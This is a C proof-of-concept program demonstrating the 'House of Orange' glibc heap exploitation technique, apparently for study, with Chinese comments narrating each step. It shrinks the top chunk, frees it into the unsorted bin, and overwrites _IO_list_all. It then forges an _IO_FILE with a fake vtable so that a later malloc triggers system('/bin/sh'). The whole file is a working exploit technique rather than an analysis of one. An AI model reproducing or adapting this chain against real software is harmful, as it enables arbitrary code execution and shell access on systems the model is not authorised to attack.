#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int winner ( char *ptr);
int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;
    fprintf(stderr, "首先 malloc 一块 0x400 大小的 chunk\n");
    p1 = malloc(0x400-16);
    fprintf(stderr, "假设存在堆溢出，把 top chunk 的 size 给改为一个比较小的 0xc01\n");
    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;
    fprintf(stderr, "再去 malloc 一个挺大的 chunk 的时候，因为 top chunk 不够大所以会把现在的 top chunk 给 free 掉，我们称它为 old top chunk\n");
    p2 = malloc(0x1000);
    fprintf(stderr, "这时候 top[2] 跟 top[3] 是 unsortedbin 的地址了，然后 _IO_list_all 跟 unsortedbin 的偏移是 0x9a8，计算得到 _IO_list_all\n");
    io_list_all = top[2] + 0x9a8;
    fprintf(stderr, "设置 old top chunk 的 bk 指针为 io_list_all - 0x10 待会进行 unsortedbin attack，把 _IO_list_all 改为 unsortedbin 的地址\n");
    top[3] = io_list_all - 0x10;
    fprintf(stderr, "将字符串/bin/sh放到 old top chunk 的开头，并且把 size 改为 0x61，这里改为 0x61 是因为这个大小属于 smallbin[4]，它与 unsortedbin 的偏移，跟 _chain 与 io_list_all 的偏移一样\n");
    memcpy( ( char *) top, "/bin/sh\x00", 8);
    top[1] = 0x61;
    _IO_FILE *fp = (_IO_FILE *) top;
    fprintf(stderr, "后面就是为了满足一些检查了，包括：fp->_mode = 0、_IO_write_base 小于 _IO_write_ptr\n");
    fp->_mode = 0;
    fp->_IO_write_base = (char *) 2;
    fp->_IO_write_ptr = (char *) 3;
    fprintf(stderr, "然后定位到 jump_table[3] 也就是 _IO_OVERFLOW 改为 system 函数的地址\n");
    size_t *jump_table = &top[12];
    jump_table[3] = (size_t) &winner;
	fprintf(stderr, "最后把 io_list_all 的 vatble 改为我们想让他找的那个 jump_table，然后去 malloc 一个触发就可以了\n");
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table;
    malloc(10);
    return 0;
}

int winner(char *ptr)
{
    system(ptr);
    return 0;
}